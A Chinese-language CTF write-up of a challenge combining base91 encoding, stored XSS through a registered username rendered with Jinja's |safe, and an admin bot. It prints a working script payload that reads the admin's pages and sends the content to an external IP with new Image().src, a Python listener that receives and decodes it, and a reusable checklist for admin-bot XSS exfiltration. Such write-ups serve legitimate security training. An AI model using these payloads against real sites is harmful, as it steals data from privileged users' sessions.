---
title: 91星人 - 存储型XSS + AdminBot 复盘
date: 2026-08-15 10:05:00
categories:
  - CTF wp
tags:
  - CTF
  - XSS
  - Admin Bot
disableNunjucks: true
description: 91星人 - 存储型XSS + AdminBot 复盘
---


> 考点：base91 编码 + 存储型 XSS + Admin Bot 外带
> 日期：2026-08-02

---

## 一、攻击链总览（一句话）

```
注册 username 注入 <script> → 创建笔记 → 把 sid 提交给 /patrol
→ bot 以 admin 登录访问 → XSS 在 admin 会话执行
→ 读 admin 的 flag → 外带到攻击者服务器 → 解码得 flag
```

---

## 二、考点拆解

### 考点 1：base91 编码（题目名来源）

- flag 在数据库里不是明文，是 `based91.encode(flag)` 的**密文**
- base91 字符集特殊：含 `€ °` 等非 ASCII 字符，**必须用题目自带的 based91.py**（标准库字母表不同会不匹配）
- 出题人预期解法：**逆向 base91**，构造输入字节使编码输出含 `<script>`
  - 用 `/beam` 的 hex 输入特性（`unpack_transmission` 会自动 hex 解码）
  - 我写过一个 preimage 搜索脚本（BFS 匹配前缀），7 字节输入就能让输出以 `<script>` 开头

### 考点 2：存储型 XSS 注入点 —— `{{encoding|safe}}`

- `view_encoding.html`：`<div class="subtitle">{{encoding|safe}}</div>`
- `|safe` = 不转义输出，直接把 dict 的 **repr** 当 HTML 输出：
  `{'text': '<base91密文>', 'creator': '<用户名>'}`
- **关键绕过**：`text` 被 base91 编码挡住了，但 **`creator` = 注册用户名，完全可控**，原样进 HTML → 注入点不在 text，在 **username**
- 这就是"绕过 vs 攻破"：走 `creator` 绕过了 base91 这堵墙

### 考点 3：Admin Bot 提权（puppeteer）

- `/patrol` 提交 40 位 hex 的 sid → 启动 node bot
- bot 用 admin 账号登录（密码是硬编码 `warden_code`），访问 `/s/<sid>`
- `read_signal(sid, "admin")` 对 admin **不校验 owner** → bot 能看到我们创建的笔记
- 我们的 username 渲染在 admin 看的页面里 → XSS 以 admin 会话执行

### 考点 4：XSS 外带（exfiltration）

- bot 在服务器端，headless 浏览器，**必须把数据发到攻击者服务器**
- 流程：`fetch("/")` 拿 admin dashboard → `split("/s/")[1].substring(0,40)` 抠出 flag 的 sid → `fetch("/s/"+sid)` 读 flag 页面 → 外带
- **外带方式**：`new Image().src = "http://VPS:8080/?d=" + encodeURIComponent(t)`
- **坑**：`btoa()` 遇到中文页面会抛异常（只支持 Latin1）→ 必须用 `encodeURIComponent`

### 考点 5：Payload 构造 —— 规避 Python repr 转义

**来源**：payload 经 username 注入 → 存库为 creator → `{{encoding|safe}}` 输出 **Python dict 的 repr** → repr 会对字符串里的引号和反斜杠自动转义 → 你的 JS 被"二次加工"。

**实测规则**（用题目自带的 repr 验证）：
- 全用双引号 `fetch("/")` → repr 原样，正常 ✅
- 全用单引号 `alert('x')` → Python 改用双引号包裹，也正常 ✅
- **混用**单双引号 → JS 里单引号定界符被转义成 `\'` → **JS 语法错误** ❌
- **含反斜杠**（正则 `/\/s\//`）→ 反斜杠翻倍 `\\` → **正则失效** ❌

**两条死规则**：
1. 禁止反斜杠 `\`（必被转义成 `\\`）
2. 禁止单双引号混用（单引号定界符会被转义）

**最简单写法**：JS 全用双引号 + 用 `split()` 代替正则。

**通用考点**：payload 到达浏览器前可能经过"二次处理层"（repr / JSON / URL编码 / HTML实体），做题先问"我的输入会经过哪层再进页面？"

---

## 三、最终 payload（作为 username 提交）

```html
<script>
fetch("/").then(r=>r.text()).then(h=>{
let s=h.split("/s/")[1].substring(0,40);
fetch("/s/"+s).then(r=>r.text()).then(t=>{
new Image().src="http://120.53.249.234:8080/?d="+encodeURIComponent(t);
});
});
</script>
```

**为什么这样写**：
- `h.split("/s/")[1]` → 取 dashboard 里第一个 `/s/` 后的字符串
- `.substring(0,40)` → 前 40 个 hex = sid（`secrets.token_hex(20)` 固定 40 位）
- `encodeURIComponent` → 中文/emoji 也能编码（页面含中文，btoa 会崩）
- `new Image().src` → 发 GET 请求，不关心 CORS 响应，最简外带

---

## 四、服务端接收 + 解码

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote, urlparse
import re, based91

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = urlparse(self.path)
        d = unquote(q.query.split("d=",1)[1]) if "d=" in q.query else ""
        m = re.search(r"text': '([^']*)'", d)
        if m:
            print("[FLAG]", bytes(based91.decode(m.group(1))).decode())
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
```

---

## 五、可复用的套路（下次遇到直接套）

```
1. 看到 {{ x | safe }} / innerHTML / document.write → 找 Sink
2. 看 Sink 输出的数据里哪些字段可控（dict repr 全字段查一遍）
3. 看到 /report /visit /patrol 提交接口 → 大概率有 admin bot
4. 构造 payload：注入 → bot 触发 → fetch 读数据 → new Image 外带
5. 注意：注入点若被二次转义（repr/json）→ 禁单引号、禁反斜杠
```

---

## 六、本题做题记录

- ❌ 豆包 payload 失败原因：`btoa(t)` 遇中文页面崩溃，外带请求根本没发出去
- ✅ 成功解法：`encodeURIComponent` 版，username 注入，一次通过
- 收获：base91 逆向（豆包路线）和 username 注入（绕过路线）都理解了，后者的关键是"Sink 输出的是 dict repr，creator 字段不过编码"
